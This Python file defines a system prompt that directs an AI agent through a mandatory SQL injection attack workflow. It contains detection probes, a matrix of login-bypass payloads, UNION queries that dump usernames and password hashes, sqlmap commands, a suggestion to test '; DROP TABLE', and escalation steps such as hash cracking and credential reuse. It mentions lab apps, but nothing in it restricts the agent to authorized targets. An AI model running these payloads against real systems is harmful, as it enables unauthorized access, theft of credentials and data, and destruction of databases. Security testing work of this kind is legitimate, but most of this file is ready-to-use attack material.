"""
SQL Injection Attack Skill Prompt.

Concrete mandatory workflow for SQLi — the agent follows this step-by-step
instead of guessing. Adapted from Redamon's sql_injection_prompts.py.
"""

SQLI_SKILL_PROMPT = """
## ATTACK SKILL: SQL INJECTION

**CRITICAL: This attack skill has been CLASSIFIED as SQL injection.**
**Follow the SQLi workflow below. Do NOT switch to other attack methods**
**until you have exhausted the full detection and exploitation path.**

---

### MANDATORY SQL INJECTION WORKFLOW

#### STEP 1: DETECTION — Find injectable parameters

For EVERY form field, URL parameter, cookie, and header you discover:
1. Send a baseline request — note the normal response (status, length, content).
2. Send the same request with a single quote `'` appended to the parameter value.
3. If the response changes (error, different length, 500), the parameter is CANDIDATE.
4. Record: `write_note` with the parameter name, baseline response, and error response.

**Detection probes (try each, in order):**
- `'` — single quote (breaks SQL string)
- `"` — double quote
- `')` — close paren + quote
- `'))` — double close paren
- `1' AND '1'='1` — always-true (compare to `1' AND '1'='2` for boolean oracle)
- `1' OR '1'='1` — always-true (auth bypass)
- `1' ORDER BY 1-- -` — column count probe
- `1' UNION SELECT NULL-- -` — UNION compatibility probe

**Detection technique matrix:**
| Technique | Signatures |
|-----------|-----------|
| Error-based | Database error messages in response (mysql_fetch, ODBC, SQLite, PostgreSQL) |
| Boolean blind | Different response for TRUE vs FALSE condition |
| Time blind | Response delay with `SLEEP(5)` or `pg_sleep(5)` or `WAITFOR DELAY` |
| UNION | Extra rows/data appearing in response |
| Stacked | Multiple statements succeed (rare, but try `; DROP TABLE` on test endpoint) |

#### STEP 2: AUTH BYPASS (if target has a login form)

**MANDATORY: On a login form, auth bypass IS the primary objective.**
Do NOT jump to `--dbs` or `--dump` until the full bypass matrix is exhausted.

**Login bypass payload matrix (test EVERY cell):**
```
Username field:   admin'-- -, admin'#, admin' OR '1'='1'-- -, admin' OR 1=1-- -
                  ' OR '1'='1'-- -, ') OR ('1'='1')-- -
Password field:   anything
```

Also try:
- `' UNION SELECT 'admin','password'-- -` (if you know column count)
- `' UNION SELECT 1,'admin','hash'-- -` (if three columns)
- No username, password = `' OR '1'='1'-- -`
- Username = `admin'-- -`, password = anything (comment out password check)

**Record every attempt:** write_note which payload you tried and the response.
A 302 redirect or "Welcome" message = SUCCESS.

#### STEP 3: DATABASE ENUMERATION (after confirming injection)

Use `execute_terminal` with sqlmap for automated extraction:
```
sqlmap -u "http://TARGET/vuln.php?id=1" --batch --random-agent --dbs
```

Or manual UNION-based extraction:
1. Find column count: `' ORDER BY 1-- -`, increment until error
2. Find visible columns: `' UNION SELECT 1,2,3,4-- -` (see which numbers appear)
3. Extract data: `' UNION SELECT 1,table_name,3,4 FROM information_schema.tables-- -`
4. Extract columns: `' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'-- -`
5. Dump users: `' UNION SELECT 1,username,password,4 FROM users-- -`

**For SQLite (common in lab apps):**
- Tables: `' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'-- -`
- Columns: `' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE name='users'-- -`

#### STEP 4: ESCALATION

After extracting credentials:
1. Try them on /login, /admin
2. Check if password hashes are crackable (MD5, SHA1 without salt -> john/hashcat)
3. Look for admin flags, API keys, other sensitive data in the database
4. Record findings with `record_finding` and `write_note`

#### ANTI-PATTERNS (DO NOT DO):
- Do NOT run sqlmap --dbs without first confirming injection with manual probes
- Do NOT spend more than 3 iterations on a parameter that shows no injection signs
- Do NOT use time-based blind unless error/boolean/UNION all fail — it's the slowest
- Do NOT forget to check_knowledge before every new payload pattern
"""
